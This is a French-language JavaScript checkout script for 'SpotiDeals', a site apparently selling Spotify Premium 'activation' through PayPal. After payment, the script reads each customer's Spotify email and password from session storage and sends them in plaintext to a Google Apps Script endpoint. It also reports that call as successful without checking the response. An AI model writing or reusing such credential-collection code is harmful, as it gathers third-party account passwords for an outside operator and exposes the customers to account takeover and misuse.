'use strict';

// --- CONSTANTS ---
const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxEmJdgcerK1ENvsy8IvSnAZDJ6p4fr9hfO87haKbKrVXZaRf2Z3wnRzyQSDl527VtW/exec';
const FORMSPREE_URL = 'https://formspree.io/f/xanorewp';

// --- UTILITY FUNCTIONS ---

/**
 * Generates a unique order ID.
 * @returns {string} The unique order ID.
 */
function generateOrderID() {
    const timestamp = Date.now().toString(36);
    const random = Math.random().toString(36).substr(2, 5);
    return `SPD-${timestamp}-${random}`.toUpperCase();
}

/**
 * Sends order data to Google Apps Script.
 * @param {object} orderData The data to send.
 * @returns {Promise<boolean>} True if successful, false otherwise.
 */
async function sendToGoogleScript(orderData) {
    try {
        const response = await fetch(GOOGLE_SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors', // Important for this type of endpoint
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(orderData)
        });
        // "no-cors" means we can't inspect the response, so we optimistically assume it worked.
        return true;
    } catch (error) {
        console.error('Error sending data to Google Script:', error);
        return false;
    }
}

/**
 * Sends a confirmation email via Formspree.
 * @param {string} email The customer's email.
 * @param {string} orderID The order ID.
 * @returns {Promise<boolean>} True if successful, false otherwise.
 */
async function sendConfirmationEmail(email, orderID) {
    try {
        const response = await fetch(FORMSPREE_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
            body: JSON.stringify({
                _to: email,
                _subject: `Confirmation de votre commande SpotiDeals #${orderID}`,
                orderID: orderID,
                message: "Merci pour votre commande ! Nous la traiterons dans les plus brefs délais."
                // The actual email template should be configured in your Formspree account.
            })
        });
        return response.ok;
    } catch (error) {
        console.error('Error sending confirmation email:', error);
        return false;
    }
}


// --- PAYPAL INTEGRATION ---

/**
 * Initializes the PayPal Buttons.
 */
function initPayPalButtons() {
    if (typeof paypal === 'undefined') {
        console.error('PayPal SDK not loaded.');
        return;
    }

    paypal.Buttons({
        createOrder: function(data, actions) {
            return actions.order.create({
                purchase_units: [{
                    amount: { value: '82.62', currency_code: 'CAD' },
                    description: 'Pack Activation Spotify Premium 12 mois'
                }]
            });
        },

        onApprove: async function(data, actions) {
            try {
                const details = await actions.order.capture();
                const email = sessionStorage.getItem('spotifyEmail');
                const password = sessionStorage.getItem('spotifyPassword'); // Retrieve password
                const orderID = generateOrderID();

                if (!email || !password) {
                    throw new Error('User session data (email/password) not found.');
                }
                
                // 1. Send data to Google Script for processing
                const scriptData = {
                    orderID: orderID,
                    email: email,
                    password: password, // Send the password
                    date: new Date().toISOString(),
                    status: 'pending',
                    notes: `Paiement PayPal reçu: ${details.id}`
                };
                const googleScriptSuccess = await sendToGoogleScript(scriptData);

                // 2. Send confirmation email via Formspree
                const emailSuccess = await sendConfirmationEmail(email, orderID);

                // 3. Handle UI feedback
                if (googleScriptSuccess) {
                    alert(`✅ Paiement réussi ! Votre numéro de commande est : ${orderID}. Un email de confirmation a été envoyé à ${email}.`);
                    window.location.href = `tracking.html?order=${orderID}`;
                } else {
                    // This case is tricky. Payment is made, but backend failed.
                    alert(`⚠️ Votre paiement a été accepté, mais une erreur est survenue lors de la création de votre commande. Votre numéro de transaction PayPal est ${details.id}. Veuillez contacter le support avec ce numéro.`);
                }
                
                // Clear session storage after processing
                sessionStorage.removeItem('spotifyEmail');
                sessionStorage.removeItem('spotifyPassword');

            } catch (error) {
                console.error('Error during PayPal onApprove:', error);
                alert('Une erreur inattendue est survenue après votre paiement. Veuillez contacter le support.');
            }
        },

        onError: function(err) {
            console.error('PayPal Button Error:', err);
            alert('Une erreur est survenue avec le processus de paiement PayPal. Veuillez réessayer.');
        }

    }).render('#paypal-button-container');
}


// --- INITIALIZATION ---

document.addEventListener('DOMContentLoaded', () => {
    const emailFromSession = sessionStorage.getItem('spotifyEmail');
    const emailDisplay = document.getElementById('summary-email');

    if (emailDisplay) {
        if (emailFromSession) {
            emailDisplay.textContent = emailFromSession;
        } else {
            emailDisplay.textContent = "Non trouvé";
            alert("Erreur: Impossible de retrouver les informations de votre session. Veuillez recommencer le processus de commande.");
            // Optionally, disable the payment button if session data is missing
        }
    }
    
    initPayPalButtons();
}); 